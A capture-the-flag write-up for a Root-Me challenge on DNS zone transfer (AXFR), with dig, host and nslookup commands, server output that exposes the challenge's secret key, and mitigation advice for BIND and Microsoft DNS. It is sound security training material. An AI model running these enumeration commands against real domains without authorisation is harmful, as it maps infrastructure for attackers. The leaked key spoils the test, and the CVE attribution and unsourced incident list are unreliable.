# DNS - Zone Transfer

`Network` • `Easy` • `15 pts`

## TL;DR

Exploit misconfigured DNS server allowing unrestricted AXFR (zone transfer) to dump all DNS records and extract secret key from TXT record.

**Flag:** `[REDACTED]`

---

## Challenge Description

> A careless administrator set up a DNS service for the domain "ch11.challenge01.root-me.org"...

**Target:** `challenge01.root-me.org:54011`  
**Zone:** `ch11.challenge01.root-me.org`

---

## Recon

**DNS Zone Transfer (AXFR)** is a mechanism for replicating DNS databases between primary and secondary nameservers. When misconfigured, it allows anyone to retrieve **all DNS records** for a domain.

**Vulnerability:** Server accepts AXFR requests from any source instead of restricting to authorized secondary servers.

---

## Exploitation

### Method 1: dig (Recommended)
```bash
$ dig @challenge01.root-me.org -p 54011 ch11.challenge01.root-me.org AXFR

; <<>> DiG 9.18.39 <<>> @challenge01.root-me.org -p 54011 ch11.challenge01.root-me.org AXFR
ch11.challenge01.root-me.org. 604800 IN SOA ch11.challenge01.root-me.org. root.ch11.challenge01.root-me.org. 2 604800 86400 2419200 604800
ch11.challenge01.root-me.org. 604800 IN TXT "DNS transfer secret key : CBkFRwfNMMtRjHY"
ch11.challenge01.root-me.org. 604800 IN NS  ch11.challenge01.root-me.org.
ch11.challenge01.root-me.org. 604800 IN A   127.0.0.1
challenge01.ch11.challenge01.root-me.org. 604800 IN A 192.168.27.101
```

**Flag extracted from TXT record:** `[REDACTED]`

### Method 2: host
```bash
host -l ch11.challenge01.root-me.org challenge01.root-me.org -T -p 54011
```

### Method 3: nslookup
```bash
nslookup
> server challenge01.root-me.org 54011
> set type=AXFR
> ch11.challenge01.root-me.org
```

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Impact |
|---------------|--------|
| **CWE-200** | Exposure of Sensitive Information |
| **CVE-2020-8616** | BIND DNS software zone transfer vulnerability |
| **MITRE ATT&CK T1590.002** | DNS enumeration for reconnaissance |

**Information Disclosed via Zone Transfer:**
- **Internal hostnames** (mail servers, admin panels, dev servers)
- **IP addresses** (network topology mapping)
- **Subdomains** (attack surface expansion)
- **Service records** (SRV: services and ports)
- **TXT records** (SPF, DKIM, secrets in misconfigurations)

**Real-world incidents:**
- 2018: Multiple Fortune 500 companies exposed internal infrastructure
- 2020: Government agencies' zone transfers accessible publicly
- Used in reconnaissance phase of targeted attacks (APTs)

### Secure Configuration

**BIND Configuration (`/etc/bind/named.conf`):**
```
zone "example.com" {
    type master;
    file "/etc/bind/zones/example.com.zone";
    allow-transfer { 
        192.168.1.10;  // Secondary NS IP only
        192.168.1.11;
    };
};
```

**Microsoft DNS Server:**
- DNS Manager → Zone Properties → Zone Transfers tab
- Select "Only to the following servers"
- Add authorized secondary NS IPs

**Best Practices:**
1. **Restrict AXFR** to authorized secondary nameservers only (IP whitelist)
2. **Use TSIG** (Transaction Signatures) for authenticated transfers
3. **Monitor zone transfer attempts** (logs, alerts for unauthorized requests)
4. **Regular audits** with `dig`, `nmap`, or DNS enumeration tools
5. **Split-horizon DNS** (internal vs external zones)

---

## Key Takeaways

**Technical Skills:**
- Performed DNS zone transfer (AXFR) query
- Analyzed DNS record types (SOA, NS, A, TXT)
- Used `dig` for DNS reconnaissance

**Security Concepts:**
- Zone transfers are powerful reconnaissance tools for attackers
- Default-allow configurations expose internal infrastructure
- DNS misconfigurations enable network mapping before attacks
- Information disclosure via TXT records (secrets, SPF, DKIM)

---

## References

- [RFC 5936 - DNS Zone Transfer Protocol (AXFR)](https://datatracker.ietf.org/doc/html/rfc5936)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- [OWASP: Information Disclosure](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)
- [SANS: Securing DNS Zone Transfers](https://www.sans.org/reading-room/whitepapers/dns/securing-dns-zone-transfers-868)